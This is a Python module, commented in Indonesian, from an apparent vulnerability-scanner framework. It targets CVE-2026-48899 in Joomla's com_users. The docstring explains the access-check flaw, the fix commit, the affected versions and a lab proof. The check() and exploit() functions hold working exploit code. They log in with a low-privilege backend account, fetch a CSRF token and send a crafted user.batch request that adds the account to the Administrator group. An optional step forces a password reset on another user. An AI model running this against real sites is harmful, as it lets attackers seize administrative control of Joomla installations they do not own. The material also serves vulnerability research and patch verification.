#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
Joomla! Core — modul MEGAPACK (klaster joomla_core).

CVE-2026-48899 — pemeriksaan akses tidak benar pada task batch com_users (privesc).
Affected : Joomla! < 5.4.6 dan 6.0.0-6.1.0 (lihat "BATAS VERSI")   |   Patched: 5.4.6 / 6.1.1
NVD      : CVSS 3.1 9.8 / AV:N/AC:L/**PR:N**/UI:N -- **PR:N SALAH** (butuh sesi backend)

SUMBER (diverifikasi dari commit rilis, bukan dari teks advisory):
  Commit `bd77f0e215` "Prepare Joomla! 6.1.1" (2026-05-15) menambahkan, di antaranya:

  administrator/components/com_users/src/Model/UserModel.php :: batchUser() dan batchReset()
      +  // Check if user can perform management tasks in com_users
      +  if (!$this->getCurrentUser()->authorise('core.manage', 'com_users')) {
      +      $this->setError(Text::_('JLIB_APPLICATION_ERROR_BATCH_CANNOT_EDIT'));
      +      return false;
      +  }

  administrator/components/com_users/src/Dispatcher/Dispatcher.php
      +  // If the user editing layout is called, we assume its the user.edit task
      +  if (!$task && $view === 'user' && $layout === 'edit') { $task = 'user.edit'; }

  api/components/com_users/src/Controller/GroupsController.php -> delete()/allowAdd()
      ditambahi cek `authorise('core.admin', $this->option)` (jalur Web Services API).

  plugins/sampledata/* -> cek core.edit/core.manage per komponen (judul advisory resmi
  menyebut "incorrect access control in sample data plugins").

MEKANISME (dipakai modul ini):
  `ComponentDispatcher::checkAccess()` pada com_users memberi pengecualian agar pengguna bisa
  menyunting profilnya sendiri:
        3.0.0-6.0.x:  if (in_array($task, ['user.edit','user.apply','user.save','user.cancel'])
                          || ($view === 'user' && $layout === 'edit')) {
                          if ((int) $user->id === $this->input->getInt('id')) return;   // lolos
                      }
  Klausa kedua hanya melihat view/layout, BUKAN task. Jadi request
        index.php?option=com_users&view=user&layout=edit&id=<id sendiri>&task=user.batch
  melewati pemeriksaan `core.manage` komponen, lalu task batch benar-benar dijalankan.
  Model batchUser() hanya menjaga grup super-admin:
        $iAmSuperAdmin = authorise('core.admin');
        if (!$iAmSuperAdmin && Access::checkGroup($groupId, 'core.admin')) { tolak }
  sehingga aktor non-super tetap bisa memindahkan user ke grup NON-super — termasuk
  grup 7 "Administrator" yang di aturan root Joomla memegang `core.manage` untuk semua
  komponen => eskalasi hak yang nyata. Grup 8 (Super Users) DITOLAK oleh guard tersebut
  (dibuktikan di lab: percobaan group_id=8 tidak mengubah keanggotaan).

BATAS VERSI (grep kode nyata pada paket rilis, bukan teks advisory):
  5.4.5  tidak ada BATCH_CANNOT_EDIT  -> RENTAN
  5.4.6  ada                          -> patched (back-port)
  6.0.3  tidak ada                    -> RENTAN
  6.1.1+ ada (per commit fix)         -> patched
  (4.x/5.0-5.3 belum diverifikasi di lab — modul memperlakukannya sebagai rentan
   berdasarkan rentang < 5.4.6, dan menandainya di bukti.)

BUKTI LAB (2026-11-08), Joomla 6.0.3 @8140 vs 6.1.3 @8141, PHP 8.3 + MySQL 8:
  aktor `labmgr` = grup 6 (Manager): punya core.login.admin, TANPA core.manage com_users.
  | target | com_users list sebelum | POST user.batch (group 7) | sesudah | keanggotaan DB |
  | 6.0.3  | 403                    | 303 diterima              | **200** | 6 + **7** |
  | 6.1.3  | 403                    | 403 ditolak               | 403     | 6 (tidak berubah) |
  | 6.0.3  | (sudah 7)              | group_id=8 (super)        | 200     | tetap 6+7 (guard super) |
"""

import random
import re
import string

import requests

from mp import (CveModule, ST_CLEAN, ST_INFO, ST_PWN, ST_SKIP, ST_UNKNOWN, ST_VULN,
                detect_platform, parse_ver, register, ver_le, ver_lt)

MANIFEST = "/administrator/manifests/files/joomla.xml"
DEFAULT_GROUP = "7"          # grup "Administrator" (non-super) — plafon tanpa hak Super User


def _joomla_version(t, h):
    cached = getattr(t, "_j48899ver", None)
    if cached is not None:
        return cached
    val = (None, "")
    r = h.get(f"{t.url}{MANIFEST}")
    if r is not None and r.status_code == 200 and "<version>" in (r.text or ""):
        m = re.search(r"<version>\s*([0-9][0-9.]*)", r.text)
        if m:
            v = parse_ver(m.group(1))
            if v:
                val = (v, m.group(1))
    try:
        t._j48899ver = val
    except Exception:  # noqa: BLE001
        pass
    return val


def _vulnerable(ver):
    """< 5.4.6 atau 6.0.0-6.1.0 -> rentan (6.1.1 memuat cek core.manage)."""
    if ver is None:
        return None
    if ver_lt(ver, (5, 4, 6)):
        return True
    if not ver_lt(ver, (6, 0, 0)) and ver_lt(ver, (6, 1, 1)):
        return True
    return False


def _rand(n=8):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def _tok(text):
    m = re.search(r'name="([a-f0-9]{32})"\s+value="1"', text or "")
    return m.group(1) if m else None


def _login(base, user, password, timeout=25):
    s = requests.Session()
    r = s.get(base + "/administrator/index.php", timeout=timeout)
    t = _tok(r.text)
    if not t:
        return None, None, "token login tidak ditemukan (bukan Joomla admin?)"
    r2 = s.post(base + "/administrator/index.php",
                data={"username": user, "passwd": password, "option": "com_login",
                      "task": "login", "return": "aW5kZXgucGhw", t: "1"},
                timeout=timeout)
    low = r2.text.lower()
    if "logout" not in low and "com_cpanel" not in low:
        return None, None, f"login gagal (http={r2.status_code})"
    return s, r2.text, "ok"


def _own_id(s, base, timeout=25):
    """id user yang login, dari tautan 'Edit Account' di halaman admin."""
    r = s.get(base + "/administrator/index.php", timeout=timeout)
    ids = re.findall(r'task=user\.edit&(?:amp;)?id=(\d+)', r.text or "")
    return ids[0] if ids else None


def _token_selfedit(s, base, uid, timeout=25):
    r = s.get(base + f"/administrator/index.php?option=com_users&task=user.edit&id={uid}",
              timeout=timeout)
    return _tok(r.text), r.status_code


def _can_manage_users(s, base, timeout=25):
    r = s.get(base + "/administrator/index.php?option=com_users&view=users",
              timeout=timeout, allow_redirects=True)
    return r.status_code


def _batch(s, base, uid, token, group_id, action="add", timeout=25):
    url = (base + f"/administrator/index.php?option=com_users&view=user&layout=edit"
                  f"&id={uid}&task=user.batch")
    return s.post(url, data={token: "1", "batch[group_id]": str(group_id),
                             "batch[group_action]": action, "cid[]": str(uid)},
                  timeout=timeout, allow_redirects=False)


def _batch_reset(s, base, uid, token, target_id, timeout=25):
    """batchReset: paksa user LAIN (termasuk non-super seperti Administrator) reset password.

    Nilai `batch[reset_id]` yang bermakna: 'yes' => requireReset=1, lainnya => 0
    (UserModel::batchReset: $action === 'yes' ? 1 : 0). Target Super User ditolak guard.
    """
    url = (base + f"/administrator/index.php?option=com_users&view=user&layout=edit"
                  f"&id={uid}&task=user.batch")
    return s.post(url, data={token: "1", "batch[reset_id]": "yes", "cid[]": str(target_id)},
                  timeout=timeout, allow_redirects=False)


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", f"platform={plat}"
    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    vul = _vulnerable(ver)
    if not vul:
        return ST_CLEAN, f"Joomla {ver_s} — sudah memuat cek core.manage pada batch com_users", \
                         f"version={ver_s}"
    # Version range alone is not evidence: the bypass happens inside the
    # backend and needs an authenticated low-privilege actor. Without
    # credentials the honest verdict is INFO, not VULN — matching the other
    # credential-gated modules in this cluster.
    r = h.get(t.url + "/administrator/index.php")
    reach = "tidak terset" if r is None else f"HTTP {r.status_code}"
    if not (getattr(opts, "username", None) and getattr(opts, "password", None)):
        return (ST_INFO,
                f"Joomla {ver_s} — dalam rentang rentan (batch com_users tanpa "
                f"core.manage), tetapi perlu kredensial backend berhak rendah "
                f"untuk membuktikan bypass",
                f"version={ver_s} | admin entry {reach} | butuh --username/--password")
    return (ST_UNKNOWN,
            f"Joomla {ver_s} — kredensial diberikan tetapi jalur check() hanya "
            f"menguji versi; jalankan --exploit untuk membuktikan",
            f"version={ver_s} | admin entry {reach}")


def exploit(t, h, opts):
    """
    Outcome terkontrol: akun backend berhak rendah menaikkan dirinya ke grup non-super
    (default 7 = Administrator) lalu kemampuan barunya dibuktikan dengan membuka daftar
    pengguna com_users (403 -> 200). Keanggotaan grup dikembalikan setelah pembuktian.
    """
    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not _vulnerable(ver):
        return ST_CLEAN, f"Joomla {ver_s} — sudah memuat cek core.manage pada batch com_users", \
                         f"version={ver_s}"

    user = (getattr(opts, "username", None) or "").strip()
    password = getattr(opts, "password", None) or ""
    if not user or not password:
        return (ST_VULN,
                f"Joomla {ver_s} — batch com_users tanpa cek core.manage, tetapi modul butuh "
                f"kredensial backend berhak rendah (--username/--password) sebagai aktor",
                f"version={ver_s} | kredensial tidak diberikan")

    group_id = str(getattr(opts, "membership", None) or DEFAULT_GROUP).strip() or DEFAULT_GROUP
    s, home, info = _login(t.url, user, password)
    if s is None:
        return ST_UNKNOWN, f"Joomla {ver_s} — {info}", f"version={ver_s}"

    uid = (getattr(opts, "field_id", None) or "").strip() or _own_id(s, t.url)
    if not uid:
        return ST_UNKNOWN, "tidak dapat menentukan id user yang login", f"version={ver_s}"
    ev = f"version={ver_s} | aktor={user}(id={uid}) | grup_target={group_id}"

    before = _can_manage_users(s, t.url)
    ev += f" | com_users sebelum={before}"
    if before == 200:
        return (ST_VULN,
                f"akun '{user}' sudah bisa mengelola com_users (bukan aktor berhak rendah) — "
                f"CVE tidak dapat dibedakan dari hak yang memang dimiliki",
                ev)

    token, code = _token_selfedit(s, t.url, uid)
    if not token:
        return (ST_UNKNOWN,
                f"token CSRF halaman profil sendiri tidak diperoleh (HTTP {code}) — akun mungkin "
                f"tidak punya core.login.admin", ev)

    r = _batch(s, t.url, uid, token, group_id)
    ev += f" | POST user.batch={r.status_code}"
    after = _can_manage_users(s, t.url)
    ev += f" | com_users sesudah={after}"

    if after == 200:
        rb = _batch(s, t.url, uid, token, group_id, action="del")
        ev += f" | rollback={rb.status_code}"
        msg = (f"PRIVESC: akun berhak rendah '{user}' dimasukkan ke grup {group_id} lewat task "
               f"batch com_users; kemampuan baru terbukti (com_users list {before} -> {after}). "
               f"Keanggotaan dikembalikan")
        tgt = (getattr(opts, "contact_id", None) or "").strip()
        if tgt and tgt != uid:
            rr = _batch_reset(s, t.url, uid, token, tgt)
            msgs = [m.strip() for m in re.findall(r'alert-(?:message|error)[^>]*>\s*([^<]+)',
                                                  rr.text or "")]
            ev += f" | batchReset(target={tgt})={rr.status_code} pesan={msgs[:1]}"
            if rr.status_code in (200, 303) and "cannot" not in " ".join(msgs).lower():
                msg += (f"; additionally batchReset menargetkan user {tgt} DITERIMA "
                        f"({rr.status_code}) — permintaan reset password paksa lintas-user "
                        f"(semantik requireReset=1 diverifikasi di lab, di sini status ASSUMED)")
        return (ST_PWN, msg, ev + " | bukti=com_users users list 403->200")
    return (ST_VULN,
            f"Joomla {ver_s} rawan (batch tanpa cek core.manage) tetapi eskalasi tidak berhasil "
            f"untuk grup {group_id} (com_users list {before} -> {after}) — kemungkinan grup "
            f"super-admin (guard Access::checkGroup) atau akun sudah punya hak",
            ev)


register(CveModule(
    cve="CVE-2026-48899",
    cluster="joomla_core",
    title="Joomla Core - task batch com_users tanpa cek core.manage -> privesc ke grup "
          "Administrator (RCE tidak langsung)",
    vclass="acl bypass",
    cvss="9.8",
    severity="critical",
    cwe="CWE-284",
    product="Joomla! Core (administrator/components/com_users)",
    versions_affected="<5.4.6; 6.0.0-6.1.0",
    status="verified",
    requires=[
        "sesi backend berhak rendah dengan core.login.admin tetapi TANPA core.manage pada "
        "com_users (mis. grup Manager bawaan) — NVD menandai PR:N, itu TIDAK benar",
        "grup tujuan harus non-super (grup 8 Super Users ditolak guard model)",
        "--username/--password di tool; --membership untuk grup tujuan (default 7), "
        "--field-id untuk id user yang dipindah (default = user yang login)",
    ],
    check=check,
    exploit=exploit,
    notes=(
        "Sink (<=6.0.x): administrator/components/com_users/src/Model/UserModel.php :: "
        "batchUser()/batchReset() tanpa cek core.manage; Dispatcher::checkAccess() memberi "
        "pengecualian 'view=user&layout=edit' TANPA melihat task sehingga task=user.batch lolos "
        "dari pemeriksaan komponen. Fix 6.1.1 menormalkan kasus itu ke task user.edit DAN "
        "menambah cek core.manage di model (juga cek core.admin pada API GroupsController serta "
        "cek per-komponen di plugins/sampledata — judul advisory resminya). Batas versi grep "
        "kode: 5.4.5 rentan / 5.4.6 patched; 6.0.3 rentan / 6.1.1+ patched. Bukti lab 2026-11-08: "
        "6.0.3 @8140 Manager -> com_users 403->200 dan keanggotaan 6+7; 6.1.3 @8141 -> 403 tanpa "
        "perubahan; percobaan group_id=8 tidak mengubah keanggotaan (guard super-admin). "
        "Modul mengembalikan keanggotaan grup setelah pembuktian (jejak minimal)."
    ),
))
